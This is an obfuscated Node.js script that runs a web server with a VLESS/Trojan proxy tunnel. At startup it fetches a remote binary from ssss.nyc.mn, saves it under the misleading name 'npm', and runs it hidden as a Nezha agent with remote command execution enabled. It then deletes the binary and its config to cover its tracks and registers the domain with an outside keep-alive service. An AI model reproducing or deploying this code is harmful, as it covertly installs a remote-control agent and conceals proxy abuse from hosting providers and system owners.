function _0x42d4(){const _0x124af3=['https://amd64.ssss.nyc.mn/v1','3558663kOgLiX','NEZHA_KEY','catch','8.8.4.4','base64','5232EONZCa','write','client_secret:\x20','crypto','update','a5570573-eedf-4c6f-948e-f869362693c8','text/plain','arm64','once','aarch64','&path=%2F','pipe','NEZHA_PORT','13811nRjVmv','index.html','https://arm64.ssss.nyc.mn/agent','utf-8','https://','2087','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','setsid\x20nohup\x20./npm\x20-s\x20','vless://','unlink','pop','DOMAIN','http','/bin/bash','--tls','data','type','&fp=chrome&type=ws&host=','url','2NmBvIR','sub','sha224','stream','https://dns.google/resolve?name=','2221955BpClqm','136366OkiJld','concat','chmod\x20+x\x20npm','country_code','test','hex','825392CUKlfl','close','npm\x20running\x20error:','WSPATH','npm\x20is\x20already\x20running,\x20skip\x20running...','Hello\x20world!','npm\x20download\x20successfully','Not\x20Found\x0a','https://api.ip.sb/geoip','send','split','connect','message','join','Automatic\x20Access\x20Task\x20added\x20successfully','includes','Unknown','Server\x20is\x20running\x20on\x20port\x20','NEZHA_SERVER','log','application/dns-json','replace','Server','true','axios','then','buffer','2096','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','UUID','\x20with\x20all\x20DNS\x20servers','find','readUInt16BE','decode','error','finish','443','text/html','every','arch','30WwuIlb','createHash','utf8','post','slice','createServer','readFile','npm','writeHead','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','7069512RTPZjV','https://arm64.ssss.nyc.mn/v1','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','map','digest','writeFileSync','Status','toString','net','reduce','substr','end','Answer','Failed\x20to\x20resolve\x20','length','isp','AUTO_ACCESS','trim','env','arm',':443?security=tls&sni=','NAME','readUInt8','error:\x20','trojan://','get','755955iCSafV'];_0x42d4=function(){return _0x124af3;};return _0x42d4();}function _0x28dd(_0x264856,_0x4d460c){_0x264856=_0x264856-0xca;const _0x42d4e2=_0x42d4();let _0x28dde9=_0x42d4e2[_0x264856];return _0x28dde9;}const _0x5372d5=_0x28dd;(function(_0x58daad,_0x2e8fe0){const _0x32916b=_0x28dd,_0x213e5a=_0x58daad();while(!![]){try{const _0x20c4a8=parseInt(_0x32916b(0x12d))/0x1*(-parseInt(_0x32916b(0x133))/0x2)+-parseInt(_0x32916b(0x106))/0x3+parseInt(_0x32916b(0x139))/0x4+-parseInt(_0x32916b(0x132))/0x5+parseInt(_0x32916b(0xec))/0x6+-parseInt(_0x32916b(0x11a))/0x7*(-parseInt(_0x32916b(0x10d))/0x8)+-parseInt(_0x32916b(0x108))/0x9*(parseInt(_0x32916b(0xe2))/0xa);if(_0x20c4a8===_0x2e8fe0)break;else _0x213e5a['push'](_0x213e5a['shift']());}catch(_0x4286aa){_0x213e5a['push'](_0x213e5a['shift']());}}}(_0x42d4,0xa026b));const os=require('os'),http=require(_0x5372d5(0x126)),fs=require('fs'),axios=require(_0x5372d5(0xd2)),net=require(_0x5372d5(0xf4)),path=require('path'),crypto=require(_0x5372d5(0x110)),{Buffer}=require(_0x5372d5(0xd4)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5372d5(0xfe)][_0x5372d5(0xd7)]||_0x5372d5(0x112),NEZHA_SERVER=process[_0x5372d5(0xfe)][_0x5372d5(0xcc)]||'',NEZHA_PORT=process[_0x5372d5(0xfe)][_0x5372d5(0x119)]||'',NEZHA_KEY=process[_0x5372d5(0xfe)][_0x5372d5(0x109)]||'',DOMAIN=process[_0x5372d5(0xfe)][_0x5372d5(0x125)]||'1234.abc.com',AUTO_ACCESS=process[_0x5372d5(0xfe)][_0x5372d5(0xfc)]||!![],WSPATH=process[_0x5372d5(0xfe)][_0x5372d5(0x13c)]||UUID[_0x5372d5(0xe6)](0x0,0x8),SUB_PATH=process[_0x5372d5(0xfe)]['SUB_PATH']||_0x5372d5(0x12e),NAME=process['env'][_0x5372d5(0x101)]||'',PORT=process[_0x5372d5(0xfe)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2c3c7c=_0x5372d5;try{const _0x17fe49=await axios[_0x2c3c7c(0x105)](_0x2c3c7c(0x141)),_0x1532c1=_0x17fe49[_0x2c3c7c(0x129)];ISP=(_0x1532c1[_0x2c3c7c(0x136)]+'-'+_0x1532c1[_0x2c3c7c(0xfb)])[_0x2c3c7c(0xcf)](/ /g,'_');}catch(_0x50fcf8){ISP=_0x2c3c7c(0xca);}};GetISP();const httpServer=http[_0x5372d5(0xe7)]((_0x5b33d9,_0xe6a132)=>{const _0x36c035=_0x5372d5;if(_0x5b33d9[_0x36c035(0x12c)]==='/'){const _0x3e79a1=path[_0x36c035(0x146)](__dirname,_0x36c035(0x11b));fs[_0x36c035(0xe8)](_0x3e79a1,_0x36c035(0xe4),(_0x4814ba,_0x39b288)=>{const _0x2c1fc2=_0x36c035;if(_0x4814ba){_0xe6a132[_0x2c1fc2(0xea)](0xc8,{'Content-Type':'text/html'}),_0xe6a132[_0x2c1fc2(0xf7)](_0x2c1fc2(0x13e));return;}_0xe6a132[_0x2c1fc2(0xea)](0xc8,{'Content-Type':_0x2c1fc2(0xdf)}),_0xe6a132[_0x2c1fc2(0xf7)](_0x39b288);});return;}else{if(_0x5b33d9['url']==='/'+SUB_PATH){const _0x2dc191=NAME?NAME+'-'+ISP:ISP,_0x3abd6a=_0x36c035(0x122)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x36c035(0x12b)+DOMAIN+_0x36c035(0x117)+WSPATH+'#'+_0x2dc191,_0x5b79f4=_0x36c035(0x104)+UUID+'@'+DOMAIN+_0x36c035(0x100)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x36c035(0x117)+WSPATH+'#'+_0x2dc191,_0x2194ca=_0x3abd6a+'\x0a'+_0x5b79f4,_0x2aef42=Buffer['from'](_0x2194ca)[_0x36c035(0xf3)](_0x36c035(0x10c));_0xe6a132[_0x36c035(0xea)](0xc8,{'Content-Type':_0x36c035(0x113)}),_0xe6a132[_0x36c035(0xf7)](_0x2aef42+'\x0a');}else _0xe6a132[_0x36c035(0xea)](0x194,{'Content-Type':_0x36c035(0x113)}),_0xe6a132['end'](_0x36c035(0x140));}}),wss=new WebSocket[(_0x5372d5(0xd0))]({'server':httpServer}),uuid=UUID[_0x5372d5(0xcf)](/-/g,''),DNS_SERVERS=[_0x5372d5(0x10b),'1.1.1.1'];function resolveHost(_0x212ddd){return new Promise((_0x2f3329,_0x3c03ec)=>{const _0x114246=_0x28dd;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x114246(0x137)](_0x212ddd)){_0x2f3329(_0x212ddd);return;}let _0x505586=0x0;function _0x4b83cf(){const _0x1cc0e8=_0x114246;if(_0x505586>=DNS_SERVERS[_0x1cc0e8(0xfa)]){_0x3c03ec(new Error(_0x1cc0e8(0xf9)+_0x212ddd+_0x1cc0e8(0xd8)));return;}const _0x22edfd=DNS_SERVERS[_0x505586];_0x505586++;const _0x565eb6=_0x1cc0e8(0x131)+encodeURIComponent(_0x212ddd)+'&type=A';axios['get'](_0x565eb6,{'timeout':0x1388,'headers':{'Accept':_0x1cc0e8(0xce)}})[_0x1cc0e8(0xd3)](_0x3eea2c=>{const _0x289b66=_0x1cc0e8,_0x4de0ab=_0x3eea2c[_0x289b66(0x129)];if(_0x4de0ab[_0x289b66(0xf2)]===0x0&&_0x4de0ab['Answer']&&_0x4de0ab['Answer'][_0x289b66(0xfa)]>0x0){const _0x17bab2=_0x4de0ab[_0x289b66(0xf8)][_0x289b66(0xd9)](_0x23fd58=>_0x23fd58[_0x289b66(0x12a)]===0x1);if(_0x17bab2){_0x2f3329(_0x17bab2['data']);return;}}_0x4b83cf();})[_0x1cc0e8(0x10a)](_0x1d4707=>{_0x4b83cf();});}_0x4b83cf();});}function handleVlessConnection(_0x5cf319,_0x317986){const _0xa4437d=_0x5372d5,[_0x12995d]=_0x317986,_0x27953b=_0x317986[_0xa4437d(0xe6)](0x1,0x11);if(!_0x27953b[_0xa4437d(0xe0)]((_0xd54501,_0x529763)=>_0xd54501==parseInt(uuid[_0xa4437d(0xf6)](_0x529763*0x2,0x2),0x10)))return![];let _0x3ee5ff=_0x317986['slice'](0x11,0x12)[_0xa4437d(0x102)]()+0x13;const _0x36972a=_0x317986['slice'](_0x3ee5ff,_0x3ee5ff+=0x2)['readUInt16BE'](0x0),_0x1d8721=_0x317986[_0xa4437d(0xe6)](_0x3ee5ff,_0x3ee5ff+=0x1)[_0xa4437d(0x102)](),_0x8f0f14=_0x1d8721==0x1?_0x317986['slice'](_0x3ee5ff,_0x3ee5ff+=0x4)['join']('.'):_0x1d8721==0x2?new TextDecoder()[_0xa4437d(0xdb)](_0x317986[_0xa4437d(0xe6)](_0x3ee5ff+0x1,_0x3ee5ff+=0x1+_0x317986[_0xa4437d(0xe6)](_0x3ee5ff,_0x3ee5ff+0x1)[_0xa4437d(0x102)]())):_0x1d8721==0x3?_0x317986[_0xa4437d(0xe6)](_0x3ee5ff,_0x3ee5ff+=0x10)[_0xa4437d(0xf5)]((_0x31d986,_0xe31a69,_0x17bcd1,_0x5e3eaf)=>_0x17bcd1%0x2?_0x31d986[_0xa4437d(0x134)](_0x5e3eaf[_0xa4437d(0xe6)](_0x17bcd1-0x1,_0x17bcd1+0x1)):_0x31d986,[])['map'](_0x295c9d=>_0x295c9d[_0xa4437d(0xda)](0x0)[_0xa4437d(0xf3)](0x10))[_0xa4437d(0x146)](':'):'';_0x5cf319[_0xa4437d(0x142)](new Uint8Array([_0x12995d,0x0]));const _0x23c816=createWebSocketStream(_0x5cf319);return resolveHost(_0x8f0f14)[_0xa4437d(0xd3)](_0x2def56=>{const _0x1f2c09=_0xa4437d;net[_0x1f2c09(0x144)]({'host':_0x2def56,'port':_0x36972a},function(){const _0x4bd9fe=_0x1f2c09;this[_0x4bd9fe(0x10e)](_0x317986[_0x4bd9fe(0xe6)](_0x3ee5ff)),_0x23c816['on'](_0x4bd9fe(0xdc),()=>{})[_0x4bd9fe(0x118)](this)['on'](_0x4bd9fe(0xdc),()=>{})[_0x4bd9fe(0x118)](_0x23c816);})['on'](_0x1f2c09(0xdc),()=>{});})['catch'](_0x4354fa=>{const _0x380cd4=_0xa4437d;net[_0x380cd4(0x144)]({'host':_0x8f0f14,'port':_0x36972a},function(){const _0xe079a=_0x380cd4;this[_0xe079a(0x10e)](_0x317986[_0xe079a(0xe6)](_0x3ee5ff)),_0x23c816['on']('error',()=>{})[_0xe079a(0x118)](this)['on']('error',()=>{})[_0xe079a(0x118)](_0x23c816);})['on'](_0x380cd4(0xdc),()=>{});}),!![];}function handleTrojanConnection(_0x1dfec3,_0x43c4cd){const _0x2bf6c0=_0x5372d5;try{if(_0x43c4cd[_0x2bf6c0(0xfa)]<0x3a)return![];const _0x2beae2=_0x43c4cd[_0x2bf6c0(0xe6)](0x0,0x38)[_0x2bf6c0(0xf3)](),_0xb8c1d6=[UUID];let _0x31c93f=null;for(const _0x54c618 of _0xb8c1d6){const _0x206926=crypto[_0x2bf6c0(0xe3)](_0x2bf6c0(0x12f))[_0x2bf6c0(0x111)](_0x54c618)[_0x2bf6c0(0xf0)](_0x2bf6c0(0x138));if(_0x206926===_0x2beae2){_0x31c93f=_0x54c618;break;}}if(!_0x31c93f)return![];let _0x44ff7a=0x38;_0x43c4cd[_0x44ff7a]===0xd&&_0x43c4cd[_0x44ff7a+0x1]===0xa&&(_0x44ff7a+=0x2);const _0x3acb12=_0x43c4cd[_0x44ff7a];if(_0x3acb12!==0x1)return![];_0x44ff7a+=0x1;const _0x3124fe=_0x43c4cd[_0x44ff7a];_0x44ff7a+=0x1;let _0x5ca2d6,_0x530073;if(_0x3124fe===0x1)_0x5ca2d6=_0x43c4cd['slice'](_0x44ff7a,_0x44ff7a+0x4)[_0x2bf6c0(0x146)]('.'),_0x44ff7a+=0x4;else{if(_0x3124fe===0x3){const _0x40ad9a=_0x43c4cd[_0x44ff7a];_0x44ff7a+=0x1,_0x5ca2d6=_0x43c4cd[_0x2bf6c0(0xe6)](_0x44ff7a,_0x44ff7a+_0x40ad9a)[_0x2bf6c0(0xf3)](),_0x44ff7a+=_0x40ad9a;}else{if(_0x3124fe===0x4)_0x5ca2d6=_0x43c4cd[_0x2bf6c0(0xe6)](_0x44ff7a,_0x44ff7a+0x10)[_0x2bf6c0(0xf5)]((_0x5ac079,_0x3219f7,_0x598e32,_0x12e7af)=>_0x598e32%0x2?_0x5ac079[_0x2bf6c0(0x134)](_0x12e7af[_0x2bf6c0(0xe6)](_0x598e32-0x1,_0x598e32+0x1)):_0x5ac079,[])[_0x2bf6c0(0xef)](_0x46b56d=>_0x46b56d['readUInt16BE'](0x0)[_0x2bf6c0(0xf3)](0x10))['join'](':'),_0x44ff7a+=0x10;else return![];}}_0x530073=_0x43c4cd[_0x2bf6c0(0xda)](_0x44ff7a),_0x44ff7a+=0x2;_0x44ff7a<_0x43c4cd[_0x2bf6c0(0xfa)]&&_0x43c4cd[_0x44ff7a]===0xd&&_0x43c4cd[_0x44ff7a+0x1]===0xa&&(_0x44ff7a+=0x2);const _0x103cb6=createWebSocketStream(_0x1dfec3);return resolveHost(_0x5ca2d6)[_0x2bf6c0(0xd3)](_0x41689b=>{const _0x40b8eb=_0x2bf6c0;net[_0x40b8eb(0x144)]({'host':_0x41689b,'port':_0x530073},function(){const _0x28801b=_0x40b8eb;_0x44ff7a<_0x43c4cd[_0x28801b(0xfa)]&&this['write'](_0x43c4cd[_0x28801b(0xe6)](_0x44ff7a)),_0x103cb6['on'](_0x28801b(0xdc),()=>{})[_0x28801b(0x118)](this)['on'](_0x28801b(0xdc),()=>{})['pipe'](_0x103cb6);})['on'](_0x40b8eb(0xdc),()=>{});})[_0x2bf6c0(0x10a)](_0x4b6051=>{const _0x21cd25=_0x2bf6c0;net['connect']({'host':_0x5ca2d6,'port':_0x530073},function(){const _0xd45fda=_0x28dd;_0x44ff7a<_0x43c4cd[_0xd45fda(0xfa)]&&this['write'](_0x43c4cd[_0xd45fda(0xe6)](_0x44ff7a)),_0x103cb6['on'](_0xd45fda(0xdc),()=>{})[_0xd45fda(0x118)](this)['on']('error',()=>{})[_0xd45fda(0x118)](_0x103cb6);})['on'](_0x21cd25(0xdc),()=>{});}),!![];}catch(_0x73c5a7){return![];}}wss['on']('connection',(_0x27e4ed,_0x4e94f1)=>{const _0x76fcfa=_0x5372d5,_0xc15ed9=_0x4e94f1['url']||'';_0x27e4ed[_0x76fcfa(0x115)](_0x76fcfa(0x145),_0x397264=>{const _0x595095=_0x76fcfa;if(_0x397264[_0x595095(0xfa)]>0x11&&_0x397264[0x0]===0x0){const _0x2572a6=_0x397264[_0x595095(0xe6)](0x1,0x11),_0x4a3e84=_0x2572a6[_0x595095(0xe0)]((_0xb1d07a,_0x2584aa)=>_0xb1d07a==parseInt(uuid[_0x595095(0xf6)](_0x2584aa*0x2,0x2),0x10));if(_0x4a3e84){!handleVlessConnection(_0x27e4ed,_0x397264)&&_0x27e4ed[_0x595095(0x13a)]();return;}}!handleTrojanConnection(_0x27e4ed,_0x397264)&&_0x27e4ed[_0x595095(0x13a)]();})['on'](_0x76fcfa(0xdc),()=>{});});const getDownloadUrl=()=>{const _0x123448=_0x5372d5,_0x4153cd=os[_0x123448(0xe1)]();return _0x4153cd===_0x123448(0xff)||_0x4153cd===_0x123448(0x114)||_0x4153cd===_0x123448(0x116)?!NEZHA_PORT?_0x123448(0xed):_0x123448(0x11c):!NEZHA_PORT?_0x123448(0x107):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x6728b9=_0x5372d5;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2b65f7=getDownloadUrl(),_0x5612c4=await axios({'method':'get','url':_0x2b65f7,'responseType':_0x6728b9(0x130)}),_0xe2f525=fs['createWriteStream'](_0x6728b9(0xe9));return _0x5612c4[_0x6728b9(0x129)]['pipe'](_0xe2f525),new Promise((_0x4106d4,_0x252d8)=>{const _0x544e6c=_0x6728b9;_0xe2f525['on'](_0x544e6c(0xdd),()=>{const _0x1b8175=_0x544e6c;console[_0x1b8175(0xcd)](_0x1b8175(0x13f)),exec(_0x1b8175(0x135),_0x138500=>{if(_0x138500)_0x252d8(_0x138500);_0x4106d4();});}),_0xe2f525['on'](_0x544e6c(0xdc),_0x252d8);});}catch(_0x48a5ec){throw _0x48a5ec;}},runnz=async()=>{const _0xd6ea17=_0x5372d5;try{const _0x517fcf=execSync(_0xd6ea17(0xee),{'encoding':_0xd6ea17(0x11d)});if(_0x517fcf[_0xd6ea17(0xfd)]()!==''){console[_0xd6ea17(0xcd)](_0xd6ea17(0x13d));return;}}catch(_0x4b0432){}await downloadFile();let _0x3fe106='',_0x1c8095=[_0xd6ea17(0xde),'8443',_0xd6ea17(0xd5),_0xd6ea17(0x11f),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1b8048=_0x1c8095[_0xd6ea17(0x148)](NEZHA_PORT)?_0xd6ea17(0x128):'';_0x3fe106=_0xd6ea17(0x121)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x1b8048+_0xd6ea17(0xeb);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1008cf=NEZHA_SERVER[_0xd6ea17(0x148)](':')?NEZHA_SERVER[_0xd6ea17(0x143)](':')[_0xd6ea17(0x124)]():'',_0x4e9911=_0x1c8095['includes'](_0x1008cf)?_0xd6ea17(0xd1):'false',_0x4b00e2=_0xd6ea17(0x10f)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4e9911+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0xd6ea17(0xf1)]('config.yaml',_0x4b00e2);}_0x3fe106=_0xd6ea17(0xd6);}else{console['log'](_0xd6ea17(0x120));return;}}try{exec(_0x3fe106,{'shell':_0xd6ea17(0x127)},_0x5d82b0=>{const _0xa66f7d=_0xd6ea17;if(_0x5d82b0)console[_0xa66f7d(0xdc)](_0xa66f7d(0x13b),_0x5d82b0);else console['log']('npm\x20is\x20running');});}catch(_0x23567c){console[_0xd6ea17(0xdc)](_0xd6ea17(0x103)+_0x23567c);}};async function addAccessTask(){const _0x33d1be=_0x5372d5;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x22a512=_0x33d1be(0x11e)+DOMAIN;try{const _0x4913e6=await axios[_0x33d1be(0xe5)]('https://oooo.serv00.net/add-url',{'url':_0x22a512},{'headers':{'Content-Type':'application/json'}});console[_0x33d1be(0xcd)](_0x33d1be(0x147));}catch(_0x166c10){}}const delFiles=()=>{const _0x445cde=_0x5372d5;fs[_0x445cde(0x123)]('npm',()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x3f1cad=_0x5372d5;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3f1cad(0xcd)](_0x3f1cad(0xcb)+PORT);});
